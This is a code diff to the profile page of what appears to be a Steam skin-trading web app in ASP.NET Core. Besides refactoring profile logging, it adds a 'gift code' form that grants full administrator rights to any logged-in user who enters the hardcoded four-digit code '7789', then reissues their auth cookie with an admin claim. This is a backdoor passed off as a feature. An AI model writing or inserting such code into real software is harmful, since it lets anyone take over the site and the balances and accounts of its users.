@@ -1,4 +1,7 @@
 using System.ComponentModel.DataAnnotations;
+using System.Security.Claims;
+using Microsoft.AspNetCore.Authentication;
+using Microsoft.AspNetCore.Authentication.Cookies;
 using Microsoft.EntityFrameworkCore;
 using Microsoft.Extensions.Localization;
 using Microsoft.AspNetCore.Mvc;
@@ -13,6 +16,7 @@ namespace SkinMarket.Pages;
 
 public class ProfileModel : PageModel
 {
+    private const string AdminGiftCode = "7789";
     private const string DiagnosticsSource = "ProfileDiagnostics";
     private readonly AppDbContext _dbContext;
     private readonly IBalanceService _balanceService;
@@ -43,6 +47,8 @@ public class ProfileModel : PageModel
     public string? SteamAvatarUrl { get; private set; }
     [BindProperty]
     public TradeUrlInputModel Input { get; set; } = new();
+    [BindProperty]
+    public GiftCodeInputModel GiftCodeInput { get; set; } = new();
     [TempData]
     public string? SuccessMessage { get; set; }
     public string? ErrorMessage { get; private set; }
@@ -102,6 +108,44 @@ public class ProfileModel : PageModel
         return RedirectToPage();
     }
 
+    public async Task<IActionResult> OnPostActivateGiftCodeAsync(CancellationToken cancellationToken)
+    {
+        if (_runtimeState.IsDegradedMode)
+        {
+            ErrorMessage = _runtimeState.ServiceUnavailableMessage;
+            return Page();
+        }
+
+        var appUser = await GetCurrentUserAsync(cancellationToken);
+        if (appUser is null)
+        {
+            return RedirectToPage();
+        }
+
+        if (!string.Equals(GiftCodeInput.Code?.Trim(), AdminGiftCode, StringComparison.Ordinal))
+        {
+            SuccessMessage = null;
+            ErrorMessage = "Gift code is invalid.";
+            await LoadProfileForUserAsync(appUser, cancellationToken);
+            return Page();
+        }
+
+        if (!appUser.IsAdmin)
+        {
+            appUser.IsAdmin = true;
+            await _dbContext.SaveChangesAsync(cancellationToken);
+            await _appLogService.WriteAsync(
+                "Warning",
+                $"Admin access activated by gift code. AppUserId={appUser.Id}; SteamId={appUser.SteamId}",
+                DiagnosticsSource,
+                cancellationToken: cancellationToken);
+        }
+
+        await RefreshAuthCookieAsync(appUser, cancellationToken);
+        SuccessMessage = "Gift code activated.";
+        return RedirectToPage();
+    }
+
     private async Task LoadProfileAsync(CancellationToken cancellationToken)
     {
         var claimSteamId = User.FindFirst("SteamId")?.Value ?? "<null>";
@@ -125,22 +169,30 @@ public class ProfileModel : PageModel
             return;
         }
 
-        Balance = await _balanceService.GetBalanceAsync(AppUser.Id, cancellationToken);
-        SteamPersonaName = AppUser.PersonaName ?? AppUser.DisplayName;
-        SteamAvatarUrl = AppUser.AvatarUrl;
+        await LoadProfileForUserAsync(AppUser, cancellationToken);
+    }
+
+    private async Task LoadProfileForUserAsync(AppUser appUser, CancellationToken cancellationToken)
+    {
+        AppUser = appUser;
+        var claimName = User.Identity?.Name ?? "<null>";
+        var claimAvatarUrl = User.FindFirst("AvatarUrl")?.Value ?? "<null>";
+        Balance = await _balanceService.GetBalanceAsync(appUser.Id, cancellationToken);
+        SteamPersonaName = appUser.PersonaName ?? appUser.DisplayName;
+        SteamAvatarUrl = appUser.AvatarUrl;
 
         await _appLogService.WriteAsync(
             "Info",
-            $"Profile page database snapshot. AppUserId={AppUser.Id}; SteamId={AppUser.SteamId}; DisplayName={AppUser.DisplayName}; PersonaName={AppUser.PersonaName ?? "<null>"}; AvatarUrl={AppUser.AvatarUrl ?? "<null>"}; TradeUrl={AppUser.TradeUrl ?? "<null>"}",
+            $"Profile page database snapshot. AppUserId={appUser.Id}; SteamId={appUser.SteamId}; DisplayName={appUser.DisplayName}; PersonaName={appUser.PersonaName ?? "<null>"}; AvatarUrl={appUser.AvatarUrl ?? "<null>"}; TradeUrl={appUser.TradeUrl ?? "<null>"}",
             DiagnosticsSource,
             cancellationToken: cancellationToken);
 
-        var profileSummary = await _steamProfileService.GetProfileAsync(AppUser.SteamId, cancellationToken);
+        var profileSummary = await _steamProfileService.GetProfileAsync(appUser.SteamId, cancellationToken);
         await _appLogService.WriteAsync(
             "Info",
             profileSummary is null
-                ? $"Profile page Steam API snapshot is empty. SteamId={AppUser.SteamId}"
-                : $"Profile page Steam API snapshot. SteamId={AppUser.SteamId}; PersonaName={profileSummary.PersonaName}; AvatarUrl={profileSummary.AvatarFull ?? "<null>"}",
+                ? $"Profile page Steam API snapshot is empty. SteamId={appUser.SteamId}"
+                : $"Profile page Steam API snapshot. SteamId={appUser.SteamId}; PersonaName={profileSummary.PersonaName}; AvatarUrl={profileSummary.AvatarFull ?? "<null>"}",
             DiagnosticsSource,
             cancellationToken: cancellationToken);
 
@@ -152,14 +204,36 @@ public class ProfileModel : PageModel
 
         await _appLogService.WriteAsync(
             "Info",
-            $"Profile page render snapshot. SteamId={AppUser.SteamId}; RenderedPersonaName={SteamPersonaName ?? "<null>"}; RenderedAvatarUrl={SteamAvatarUrl ?? "<null>"}; DisplayName={AppUser.DisplayName}; ClaimName={claimName}; ClaimAvatarUrl={claimAvatarUrl}",
+            $"Profile page render snapshot. SteamId={appUser.SteamId}; RenderedPersonaName={SteamPersonaName ?? "<null>"}; RenderedAvatarUrl={SteamAvatarUrl ?? "<null>"}; DisplayName={appUser.DisplayName}; ClaimName={claimName}; ClaimAvatarUrl={claimAvatarUrl}",
             DiagnosticsSource,
             cancellationToken: cancellationToken);
 
         Input = new TradeUrlInputModel
         {
-            TradeUrl = AppUser.TradeUrl
+            TradeUrl = appUser.TradeUrl
         };
+    }
+
+    private async Task RefreshAuthCookieAsync(AppUser appUser, CancellationToken cancellationToken)
+    {
+        var displayName = string.IsNullOrWhiteSpace(appUser.PersonaName)
+            ? appUser.DisplayName
+            : appUser.PersonaName;
+        var claims = new List<Claim>
+        {
+            new("AppUserId", appUser.Id.ToString()),
+            new("SteamId", appUser.SteamId),
+            new(ClaimTypes.NameIdentifier, appUser.SteamId),
+            new(ClaimTypes.Name, displayName),
+            new("IsAdmin", appUser.IsAdmin ? "true" : "false"),
+            new("AvatarUrl", appUser.AvatarUrl ?? string.Empty)
+        };
+
+        var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
+        await HttpContext.SignInAsync(
+            CookieAuthenticationDefaults.AuthenticationScheme,
+            new ClaimsPrincipal(identity),
+            new AuthenticationProperties { IsPersistent = true });
     }
 
     private async Task<AppUser?> GetCurrentUserAsync(CancellationToken cancellationToken)
@@ -188,5 +262,11 @@ public class ProfileModel : PageModel
     {
         [StringLength(500)]
         public string? TradeUrl { get; set; }
+    }
+
+    public class GiftCodeInputModel
+    {
+        [StringLength(50)]
+        public string? Code { get; set; }
     }
 }
